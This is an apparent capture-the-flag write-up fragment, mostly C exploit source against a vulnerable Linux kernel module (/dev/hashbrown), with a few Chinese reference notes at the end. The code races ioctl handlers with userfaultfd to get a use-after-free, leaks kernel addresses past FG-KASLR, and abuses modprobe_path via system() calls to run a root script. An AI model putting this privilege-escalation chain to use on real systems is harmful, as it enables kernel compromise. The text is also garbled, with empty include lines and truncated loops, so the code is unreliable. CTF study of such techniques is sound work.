        for (int i = 1; i 
    #define _GNU_SOURCE
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define UFFDIO_API 0xc018aa3f
    #define UFFDIO_REGISTER 0xc020aa00
    #define UFFDIO_UNREGISTER 0x8010aa01
    #define UFFDIO_COPY 0xc028aa03
    #define UFFDIO_ZEROPAGE 0xc020aa04
    #define UFFDIO_WAKE 0x8010aa02
    #define ADD_KEY 0x1337
    #define DELETE_KEY 0x1338
    #define UPDATE_VALUE 0x1339
    #define DELETE_VALUE 0x133a
    #define GET_VALUE 0x133b
    pthread_t thread;
    uint64_t race_page;
    static void (*race_function)();
    int target_idx;
    uint64_t kbase, shmem_vm_ops, modprobe_path;
    int fd;
    typedef struct 
    {
        uint32_t key;
        uint32_t size;
        char *src;
        char *dest;
    }request_t;
    long ioctl(int fd, unsigned long request, unsigned long param)
    {
        return syscall(16, fd, request, param);
    }
    long add_key(int fd, uint32_t key, uint32_t size, char *src) 
    {
        request_t request;
        request.key = key;
        request.size = size;
        request.src = src;
        return ioctl(fd, ADD_KEY, (unsigned long)&request);
    }
    long delete_key(int fd, uint32_t key) 
    {
        request_t request;
        request.key = key;
        return ioctl(fd, DELETE_KEY, (unsigned long)&request);
    }
    long update_value(int fd, uint32_t key, uint32_t size, char *src) 
    {
        request_t request;
        request.key = key;
        request.size = size;
        request.src = src;
        return ioctl(fd, UPDATE_VALUE, (unsigned long)&request);
    }
    long delete_value(int fd, uint32_t key) 
    {
        request_t request;
        request.key = key;
        return ioctl(fd, DELETE_VALUE, (unsigned long)&request);
    }
    long get_value(int fd, uint32_t key, uint32_t size, char *dest) 
    {
        request_t request;
        request.key = key;
        request.size = size;
        request.dest = dest;
        return ioctl(fd, GET_VALUE, (unsigned long)&request);
    }
    void leak_setup()
    {
        int shmid; // shm_file_data (kmalloc-32) leak for kernel data leak to rebase kernel with fg kaslr
        char *shmaddr;
        puts("setting up for leak");
        delete_value(fd, target_idx);
        if ((shmid = shmget(IPC_PRIVATE, 100, 0600)) == -1) 
        {
            perror("shmget error");
            exit(-1);
        }
        shmaddr = shmat(shmid, NULL, 0);
        if (shmaddr == (void*)-1) 
        {
            perror("shmat error");
            exit(-1);
        }
        return;
    }
    void uaf_setup()
    {
        puts("setting up uaf");
        delete_value(fd, target_idx);
    }
    void *racer(void *arg)
    {
        struct uffd_msg uf_msg;
        struct uffdio_copy uf_copy;
        struct uffdio_range uf_range;
        long uffd = (long)arg;
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        uf_range.start = race_page;
        uf_range.len = 0x1000;
        while(poll(&pollfd, 1, -1) > 0)
        {
            if(pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
            {
                perror("polling error");
                exit(-1);
            }
            if(read(uffd, &uf_msg, sizeof(uf_msg)) == 0)
            {
                perror("error reading event");
                exit(-1);
            }
            if(uf_msg.event != UFFD_EVENT_PAGEFAULT)
            {
                perror("unexpected result from event");
                exit(-1);
            }
            race_function();
            char uf_buffer[0x1000];
            uf_copy.src = (unsigned long)uf_buffer;
            uf_copy.dst = race_page;
            uf_copy.len = 0x1000;
            uf_copy.mode = 0;
            uf_copy.copy = 0;
            if(ioctl(uffd, UFFDIO_COPY, (unsigned long)&uf_copy) == -1)
            {
                perror("uffdio_copy error");
                exit(-1);
            }
            if (ioctl(uffd, UFFDIO_UNREGISTER, (unsigned long)&uf_range) == -1)
            {
                perror("error unregistering page for userfaultfd");
            }
            if (munmap((void *)race_page, 0x1000) == -1)
            {
                perror("error on munmapping race page");
            }
            return 0;
        }
        return 0;
    }
    void register_userfault()
    {
        int uffd, race;
        struct uffdio_api uf_api;
        struct uffdio_register uf_register;
        uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
        uf_api.api = UFFD_API;
        uf_api.features = 0;
        if (ioctl(uffd, UFFDIO_API, (unsigned long)&uf_api) == -1)
        {
            perror("error with the uffdio_api");
            exit(-1);
        }
        if (mmap((void *)race_page, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0) != (void *)race_page)
        {
            perror("whoopsie doopsie on mmap");
            exit(-1);
        }
        uf_register.range.start = race_page;
        uf_register.range.len = 0x1000;
        uf_register.mode = UFFDIO_REGISTER_MODE_MISSING;
        if (ioctl(uffd, UFFDIO_REGISTER, (unsigned long)&uf_register) == -1)
        {
            perror("error registering page for userfaultfd");
        }
        race = pthread_create(&thread, NULL, racer, (void*)(long)uffd);
        if(race != 0)
        {
            perror("can't setup threads for race");
        }
        return;
    }
    void modprobe_hax()
    {
        char filename[65];
        memset(filename, 0, sizeof(filename));
        system("echo -ne '\\xff\\xff\\xff\\xff' > /home/ctf/roooot");
        system("chmod +x /home/ctf/roooot");
        system("echo -ne '#!/bin/sh\nchmod 777 /flag.txt' > /home/ctf/w\n");
        system("chmod +x /home/ctf/w");
        system("/home/ctf/roooot");
        return;
    }
    int main(int argc, char **argv, char **envp)
    {
        // bug is two mutexes used (one for resize, one for all other operatios) -> allows for race conditions in ioctl handler
        fd = open("/dev/hashbrown", O_RDONLY);
        for (int i = 0; i 
SLAB SLUB
（主要可以看看这个）
FG-KALSR
modprobe_path的知识参考（这个之前还是出现过很多的）